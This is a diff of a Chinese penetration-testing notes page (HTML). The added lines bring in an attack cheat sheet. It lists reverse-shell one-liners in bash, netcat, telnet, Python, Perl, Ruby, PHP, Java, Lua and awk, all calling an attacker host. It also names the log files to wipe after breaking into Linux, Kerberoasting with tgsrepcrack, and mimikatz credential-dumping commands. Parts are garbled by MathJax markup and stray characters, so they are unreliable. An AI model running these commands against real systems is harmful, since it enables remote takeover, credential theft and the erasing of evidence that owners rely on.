@@ -532,6 +532,13 @@
   
 </li>
         
+          <li class="md-nav__item">
+  <a href="#shell" class="md-nav__link">
+    反弹shell
+  </a>
+  
+</li>
+        
       </ul>
     </nav>
   
@@ -986,6 +993,13 @@
   
 </li>
         
+          <li class="md-nav__item">
+  <a href="#shell" class="md-nav__link">
+    反弹shell
+  </a>
+  
+</li>
+        
       </ul>
     </nav>
   
@@ -1139,32 +1153,30 @@
 <p>信息收集</p>
 <p>漏洞挖掘</p>
 <p>漏洞利用&amp;权限提升</p>
-<p>mysql serv-u Oracle</p>
-<p>window溢出</p>
-<p>linux脏牛、内核漏洞</p>
+<p>清除测试数据，输出报告</p>
 <h3 id="linux">入侵Linux后要清楚的日志<a class="headerlink" href="#linux" title="Permanent link">&para;</a></h3>
 <table>
 <thead>
 <tr>
 <th>web</th>
-<th>sed -i -e 定向清楚</th>
+<th>sed -i -e 定向清楚  access.log, error.log</th>
 <th></th>
 </tr>
 </thead>
 <tbody>
 <tr>
 <td>history</td>
-<td>~</td>
+<td>~/bash_history</td>
 <td></td>
 </tr>
 <tr>
 <td>wtmp</td>
-<td></td>
+<td>/var/log/wtmp</td>
 <td></td>
 </tr>
 <tr>
 <td>登录日志</td>
-<td></td>
+<td>/var/log/secure</td>
 <td></td>
 </tr>
 </tbody>
@@ -1186,7 +1198,7 @@
 </tr>
 <tr>
 <td>0x03.SPN票据破解</td>
-<td>列出当前用户的票据：Kerberos::list <br>导出票据：Kerberos::list /export</td>
+<td>列出当前用户的票据：Kerberos::list <br>导出票据：Kerberos::list /export  由于加密类型是RC4_HMAC_MD5，Kerberos协议第四步TGS-REP将会返回用服务帐户的NTLM密码哈希加密的票据。 使用字典进行暴力破解：（2.txt为字典）python tgsrepcrack.py 2.txt "1-40a10000-linghuchong@MSSQLSvc<sub>College-DS1</sub>1433-COLLEGE.COM.kirbi"<br>虽然"sekurlsa::pth"在mimikatz中被称之为"Pass The Hash",但是其已经超越了以前的"Pass The Hash"，部分人将其命名为"Overpass-the-hash"，也就是"Pass-the-key"<br/>登录域成员机器，以管理员身份运行mimikatz，并输入以下命令：<br>privilege::debug  log sekurlsa::logonpasswords</td>
 <td></td>
 </tr>
 <tr>
@@ -1196,6 +1208,94 @@
 </tr>
 </tbody>
 </table>
+<h3 id="shell">反弹shell<a class="headerlink" href="#shell" title="Permanent link">&para;</a></h3>
+<p>Windows: powersnell 反弹shell、powercat 反弹shell
+Linux: bash 反弹shell、netcat 反弹shell、wget 反弹shell、python 反弹shell、
+php反弹shell</p>
+<p>一些脚本 </p>
+<p>bash
+在攻击主机上执行端口监听：
+nc -lvvp port               //port 为攻击主机端口号，并且此端口号没有被占用
+在目标主机上执行：
+bash -i &gt;&amp; /dev/tcp/攻击主机ip/port 0&gt;&amp;1                //port 为攻击主机端口号
+解释：
+bash -i   打开一个交互的bash</p>
+<blockquote>
+<p>&amp;   将标准错误输出重定向到标准输出</p>
+</blockquote>
+<p>/dev/tcp/x.x.x.x/port   意为调用socket,建立socket连接,其中x.x.x.x为要反弹到的主机ip，port为端口</p>
+<p>0&gt;&amp;1   标准输入重定向到标准输出，实现你与反弹出来的shell的交互</p>
+<p>/dev/tcp/ 是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在/dev/udp/。</p>
+<p>其他版本：</p>
+<p>exec 5&lt;&gt;/dev/tcp/x.x.x.x/9999</p>
+<p>cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&5; done
+第一条命令 建立与x.x.x.x:9999的tcp连接，并将标准输入输出作为device 5的标准输入输出</p>
+<p>第二条cat &lt;&amp;5 获取device5的输入; while read line; do $line 2&gt;&amp;5 &gt;&amp;5 一旦获取到命令便运行 然后将标准输入输出以及标准错误输出到device5中
+nc(netcat)反弹
+在攻击主机上执行端口监听：
+nc -lvvp port               //port 为攻击主机端口号，并且此端口号没有被占用</p>
+<p>在目标主机上执行：
+nc -e /bin/bash 攻击主机ip port</p>
+<p>还可以在目标主机上这样执行
+nc x.x.x.x 1234|/bin/bash|nc x.x.x.x 4321               //在攻击主机上打开两个终端，分别监听 1234 和 4321 端口，得到反弹shell后，1234 终端 输入命令， 4321 终端就会获得执行相应命令后的结果</p>
+<p>由于现在很多主机上可能没有netcat了，所以如果遇到虽然有netcat 但不支持 nc -e /bin/bash 攻击主机ip port 中 -e选项的主机，还可以这样反弹shell
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</p>
+<p>rm /tmp/f 删除命令
+mkfifo /tmp/f; 在tmp目录下写fifo文件f
+/bin/sh -i 2&gt;&amp;1 将/bin/sh 的标准错误重定向到标准输出
+nc x.x.x.x 2333 &gt;/tmp/f将nc监听到的输入 输入到fifo
+0x03. telnet反弹
+在攻击主机上打开两个终端分别监听 1234 和 4321端口,(确保端口开放，并且不被占用)，得到反弹shell后，1234 终端 输入命令， 4321 终端就会获得执行相应命令后的结果：
+nc -lvvp 1234</p>
+<p>nc -lvvp 4321
+在目标主机上执行：
+telnet 攻击主机ip 1234 | /bin/bash | telnet 攻击主机ip 4321
+常见脚本反弹</p>
+<p>脚本是在目标主机上执行，其中 x.x.x.x 均为攻击主机ip，并且需要提前在攻击主机上进行监听相关端口,接下来就不再赘述</p>
+<ol>
+<li>python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+1</li>
+<li>perl
+方法一：</li>
+</ol>
+<p>perl -e 'use Socket;<span class="arithmatex"><span class="MathJax_Preview">i="x.x.x.x";</span><script type="math/tex">i="x.x.x.x";</script></span>p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(<span class="arithmatex"><span class="MathJax_Preview">p,inet_aton(</span><script type="math/tex">p,inet_aton(</script></span>i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'
+1
+方法二：</p>
+<p>perl -MIO -e '<span class="arithmatex"><span class="MathJax_Preview">p=fork;exit,if(</span><script type="math/tex">p=fork;exit,if(</script></span>p);<span class="arithmatex"><span class="MathJax_Preview">c=new IO::Socket::INET(PeerAddr,"x.x.x.x:5555");STDIN-&gt;fdopen(</span><script type="math/tex">c=new IO::Socket::INET(PeerAddr,"x.x.x.x:5555");STDIN->fdopen(</script></span>c,r);<span class="arithmatex"><span class="MathJax_Preview">~-&gt;fdopen(</span><script type="math/tex">~->fdopen(</script></span>c,w);system<span class="arithmatex"><span class="MathJax_Preview">_ while&lt;&gt;;'
+3. Ruby
+ruby -rsocket -e 'exit if fork;c=TCPSocket.new("x.x.x.x","5555");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+4. PHP
+php -r '</span><script type="math/tex">_ while<>;'
+3. Ruby
+ruby -rsocket -e 'exit if fork;c=TCPSocket.new("x.x.x.x","5555");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+4. PHP
+php -r '</script></span>sock=fsockopen("x.x.x.x",5555);exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'
+5. Java
+    public class Revs {
+    /**
+    * @param args
+    * @throws Exception 
+    */
+     public static void main(String[] args) throws Exception {
+        // TODO Auto-generated method stub
+        Runtime r = Runtime.getRuntime();
+        String cmd[]= {"/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/x.x.x.x/5555;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&5; done"};
+        Process p = r.exec(cmd);
+        p.waitFor();
+     }
+     }
+6. Lua
+lua -e "require('socket');require('os');t=socket.tcp();t:connect('x.x.x.x','5555');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"
+7. AWK 反弹
+攻击的机器监听，在收到shell的时候不可以输入enter，不然会断开</p>
+<p>awk 'BEGIN{s="/inet/tcp/0/x.x.x.x/8080";for(;s|&amp;getline c;close&copy;)while(c|getline)print|&s;c</p>
+<p>14、简述MSF的模块和其作用
+1)辅助模块扫描、口令破解、敏感信息嗅探等;电中国垃家航合
+2)渗透攻击模块利用发现的安全漏洞对目标进行攻击，植入运行攻击载荷
+payload获取目标系统访问权:
+3)编码器模块进行编码保证不会出现坏字符，还可以做免杀处理;
+4)后渗透攻击模块获取敏感信息，实施跳板攻击等</p>
 
   <hr>
 <div class="md-source-file">
